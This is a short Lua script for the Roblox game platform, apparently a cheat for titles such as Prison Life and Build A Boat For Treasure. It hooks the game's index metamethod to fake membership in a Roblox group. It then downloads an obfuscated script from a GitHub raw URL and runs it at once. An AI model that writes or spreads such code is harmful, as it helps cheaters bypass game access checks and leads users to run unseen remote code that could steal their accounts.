-- Games supported:
  -- Natural Disaster
  -- Prison Life
  -- Laundry Simulator
  -- Lucky Blocks
  -- Build A Boat For Treasure

local LocalPlayer = game:GetService("Players").LocalPlayer
local oldIdx
oldIdx = hookmetamethod(game, "__index", function(self, method, ...)
    local ret = oldIdx(self, method, ...)
    if method == "IsInGroup" then
        return newcclosure(function(self, groupId, ...)
            if self == LocalPlayer and groupId == 11362142 then
                return true
            end
            return ret(self, groupId, ...)
        end)
    end
    return ret
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/yt-flix/sohot/main/obfuscated20%25'))()
